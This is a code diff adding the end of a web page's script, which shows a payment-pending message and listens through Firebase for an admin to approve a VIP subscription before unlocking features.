+                            errEl.innerHTML = `<div style="background: rgba(255, 159, 10, 0.15); border: 1px solid rgba(255, 159, 10, 0.4); padding: 10px; border-radius: 10px; color: #ff9f0a; font-size: 0.78rem; line-height: 1.4;">
+                                <i class="fas fa-hourglass-half me-1"></i> <strong>Order ID (${txid}) Submitted!</strong><br>
+                                Your payment is being verified by the admin. Once approved, this modal will automatically close and unlock all features. You can also message <strong>@abid64x</strong> on Telegram for 1-minute manual approval.
+                            </div>`;
+                            errEl.style.display = 'block';
+                        }
+
+                        // Listen for Realtime VIP Approval
+                        const subListener = fbDb.ref(`users_meta/${uid}/subscription`).on('value', (sSnap) => {
+                            const sub = sSnap.val();
+                            if (sub && sub.status === 'ACTIVE' && sub.expires_at > Date.now()) {
+                                fbDb.ref(`users_meta/${uid}/subscription`).off('value', subListener);
+                                closeLockModal();
+                                alert(`🎉 VIP Payment Approved by Admin! 1 Month Full Access VIP is now active!`);
+                                if (typeof evaluateIndexPermissions === 'function') evaluateIndexPermissions();
+                            }
+                        });
+                    });
+                }
+            });
+        });
+    }
+    </script>
+</body>
+</html>
